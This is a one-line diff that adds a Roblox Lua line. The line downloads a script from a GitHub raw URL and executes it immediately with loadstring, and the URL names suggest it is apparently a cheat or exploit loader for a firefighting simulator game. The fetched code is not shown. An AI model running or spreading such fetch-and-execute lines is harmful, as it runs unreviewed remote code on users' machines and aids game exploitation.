@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/firefighting-sim-spam3-014swqe2m9awto.lua"))()
